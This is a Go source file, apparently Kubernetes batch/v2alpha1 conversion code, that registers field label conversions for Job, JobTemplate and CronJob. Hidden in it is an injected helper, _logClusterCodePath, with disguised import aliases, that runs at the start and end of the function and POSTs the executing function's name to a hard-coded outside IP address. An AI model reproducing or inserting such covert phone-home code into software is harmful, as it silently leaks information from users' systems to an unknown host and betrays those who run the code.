package v2alpha1

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/runtime"
)

func addConversionFuncs(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var err error
 for _, k := range []string{"Job", "JobTemplate", "CronJob"} {
  kind := k
  err = scheme.AddFieldLabelConversionFunc(SchemeGroupVersion.WithKind(kind), func(label, value string) (string, string, error) {
   switch label {
   case "metadata.name", "metadata.namespace", "status.successful":
    return label, value, nil
   default:
    return "", "", fmt.Errorf("field label %q not supported for %q", label, kind)
   }
  })
  if err != nil {
   return err
  }
 }
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
